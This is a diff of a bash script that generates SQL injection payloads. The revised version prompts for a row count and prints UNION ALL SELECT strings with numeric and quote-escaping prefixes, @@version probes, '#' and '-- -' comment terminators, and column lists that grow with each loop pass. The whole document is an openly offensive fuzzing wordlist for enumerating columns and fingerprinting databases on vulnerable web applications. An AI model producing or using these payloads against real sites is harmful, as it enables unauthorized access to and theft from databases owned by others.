@@ -1,18 +1,36 @@
 #!/bin/bash
 
-echo '-1 union all select user() ; #'
+read -p "Enter the rows number " number
 
-echo '-1 union all select 1, user() ; #'
+echo "-500 union all select @@version "
+echo "-500 union all select @@version # "
+echo "-500 union all select @@version -- - "
+echo "-500 union all select 1 "
+echo "-500 union all select 1 # "
+echo "-500 union all select 1 -- - "
 
-str='-1 union all select  user() ; #'
 
-j="1,"
+echo "-500' union all select @@version "
+echo "-500' union all select @@version # "
+echo "-500' union all select @@version -- - "
+echo "-500' union all select 1 "
+echo "-500' union all select 1 # "
+echo "-500' union all select 1 -- - "
 
-for i in `seq 2 50`
+for i in `seq 1 $number`
 do 
+	str=""
+	for j in `seq 1 $i`
+	do
+		str=$str"$j, "
+		echo "-500 union all select $str @@version "
+		echo "-500 union all select $str @@version # "
+		echo "-500 union all select $str @@version -- - "
 
-j="$j $i,"
-
-echo "-1 union all select $j user() ; #"
+		echo "-500' union all select $str @@version "
+		echo "-500' union all select $str @@version # "
+		echo "-500' union all select $str @@version -- - "
+		
+	done	
 
 done
